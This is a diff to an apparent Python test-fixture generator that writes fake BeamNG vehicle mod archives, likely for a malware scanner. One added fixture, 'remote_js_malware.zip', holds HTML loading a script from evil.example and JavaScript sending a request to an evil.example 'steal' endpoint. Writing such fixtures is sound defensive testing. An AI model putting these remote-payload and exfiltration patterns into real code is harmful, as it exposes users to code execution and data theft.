@@ -72,6 +72,11 @@ def main() -> None:
                 "  return { template: '<svg></svg>' };\n"
                 "});\n"
                 "//https://stackoverflow.com/a/56266358\n"
+                "var icon = 'data:image/png;base64," + ("A" * 180) + "';\n"
+            ),
+            "vehicles/car/gauges_screen2/gauges_screen.js": (
+                "angular.module('gaugesScreen2', [])\n"
+                ".directive('dash', function () { return {}; });\n"
             ),
             "vehicles/car/lua/controller/demo.lua": (
                 "-- This Source Code Form is subject to the terms of the bCDDL, v. 1.1.\n"
@@ -79,6 +84,20 @@ def main() -> None:
                 "-- file, You can obtain one at http://beamng.com/bCDDL-1.1.txt\n"
                 "local M = {}\n"
                 "return M\n"
+            ),
+        },
+    )
+
+    _write_zip(
+        FIX / "remote_js_malware.zip",
+        {
+            "vehicles/car/gauges_screen/gauges_screen.html": (
+                "<html><script src=\"https://evil.example/payload.js\"></script></html>\n"
+            ),
+            "vehicles/car/gauges_screen/gauges_screen.js": (
+                "var x = new XMLHttpRequest();\n"
+                "x.open('GET', 'https://evil.example/steal');\n"
+                "var code = atob('SGVsbG8=');\n"
             ),
         },
     )
